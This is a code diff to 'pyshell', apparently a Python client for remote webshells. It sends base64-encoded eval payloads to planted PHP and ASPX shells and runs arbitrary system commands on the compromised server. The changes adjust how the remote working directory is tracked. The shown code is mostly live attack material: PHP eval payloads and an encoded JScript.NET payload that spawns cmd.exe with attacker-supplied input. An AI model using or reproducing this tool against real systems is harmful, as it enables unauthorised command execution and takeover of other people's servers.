@@ -12,7 +12,7 @@ import base64
 class pyshell:
     coding = 'utf-8'
     Type = ''
-    cmd = 'cmd'
+    cmd = 'cmd'  
     lpath = ''   #本地路径
     rpath = ''   #目标路径
     url = 'localhost'
@@ -148,9 +148,10 @@ class pyshell:
                             php_file_payload = '@eval(base64_decode($_POST[z0]));'
                             php_file_http = requests.post(url,data={pwd:php_file_payload,'z0':'ZWNobyBkaXJuYW1lKF9fRklMRV9fKTtAZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFt6MV0pKTs='})
                             php_file_html = php_file_http.text
-                            pyshell.c_file = php_file_html
+                            if pyshell.c_file == 'NULL':
+                                pyshell.c_file = php_file_html
                             while True:
-                                shell = input(pyshell.FAIL+pyshell.c_file+' > ')
+                                shell = input(pyshell.c_file+' > ')
                                 if shell == 'quit':
                                     pyshell.c_file = 'NULL'
                                     break
@@ -162,9 +163,10 @@ class pyshell:
                             aspx_file_payload = 'Response.Write(HttpContext.Current.Server.MapPath("."));'
                             aspx_file_http = requests.post(url,data={pwd:aspx_file_payload})
                             aspx_file_html = aspx_file_http.text+'\\'
-                            pyshell.c_file = aspx_file_html
+                            if pyshell.c_file == 'NULL':
+                                pyshell.c_file = aspx_file_html
                             while True:
-                                shell = input(pyshell.FAIL+pyshell.c_file+' > ')
+                                shell = input(pyshell.c_file+' > ')
                                 if shell == 'quit':
                                     pyshell.c_file = 'NULL'
                                     break
@@ -210,7 +212,7 @@ class pyshell:
                 files_http = requests.post(url,data=code_file)
                 files_http.encoding = pyshell.coding
                 files_html = files_http.text
-                z = 'cd /d "'+files_html+'"&'+shell
+                z = 'cd /d "'+pyshell.c_file+'"&'+shell
                 z_base64 = str(base64.b64encode(z.encode("utf-8")),"utf-8")
                 code = {
                 pwd:payload,
@@ -236,7 +238,7 @@ class pyshell:
                 files_http = requests.post(url,data=code_file)
                 files_http.encoding = pyshell.coding
                 files_html = files_http.text
-                z = 'cd "'+files_html+'";'+shell+';'
+                z = 'cd "'+pyshell.c_file+'";'+shell+';'
                 z_base64 = str(base64.b64encode(z.encode("utf-8")),"utf-8")
                 code = {
                     pwd:payload,
@@ -261,7 +263,7 @@ class pyshell:
             files_http = requests.post(url,data={pwd:files_payload})
             files_http.encoding = pyshell.coding
             files_html = files_http.text+'\\'
-            z2 = 'cd /d "'+files_html+'"&'+shell
+            z2 = 'cd /d "'+pyshell.c_file+'"&'+shell
             z2_base64 = str(base64.b64encode(z2.encode("utf-8")),"utf-8")
             code = {
             pwd:'Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDkzNikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MSJdKSkpO3ZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpO3ZhciBvdXQ6U3lzdGVtLklPLlN0cmVhbVJlYWRlcixFSTpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyO2MuVXNlU2hlbGxFeGVjdXRlPWZhbHNlO2MuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlO2MuUmVkaXJlY3RTdGFuZGFyZEVycm9yPXRydWU7ZS5TdGFydEluZm89YztjLkFyZ3VtZW50cz0iL2MgIitTeXN0ZW0uVGV4dC5FbmNvZGluZy5HZXRFbmNvZGluZyg5MzYpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiejIiXSkpO2UuU3RhcnQoKTtvdXQ9ZS5TdGFuZGFyZE91dHB1dDtFST1lLlN0YW5kYXJkRXJyb3I7ZS5DbG9zZSgpO1Jlc3BvbnNlLldyaXRlKG91dC5SZWFkVG9FbmQoKStFSS5SZWFkVG9FbmQoKSk7")),"unsafe");}catch(err){}Response.Write("|<-");Response.End();',
